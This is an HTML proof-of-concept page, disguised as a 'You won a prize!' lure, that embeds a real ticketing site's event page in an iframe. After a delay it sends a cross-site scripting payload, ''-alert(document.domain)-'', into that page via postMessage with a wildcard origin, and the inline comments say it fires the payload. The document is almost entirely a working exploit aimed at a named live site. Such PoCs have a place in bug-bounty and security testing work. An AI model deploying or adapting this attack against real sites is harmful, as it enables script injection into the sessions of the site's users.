<!DOCTYPE html>
<html>
<body>
    <h1>You won a prize!</h1>
    <iframe id="targetApp" src="https://www.district.in/events/ye-live-in-india-2026-buy-tickets" style="display:block;"></iframe>
    
    <script>
        // Wait for the iframe to load, then fire the payload
        setTimeout(function() {
            var target = document.getElementById('targetApp').contentWindow;
            // The '*' allows the message to be sent regardless of target origin
            target.postMessage(''-alert(document.domain)-'', '*');
            console.log("Payload fired!");
        }, 25000);
    </script>
</body>
</html>
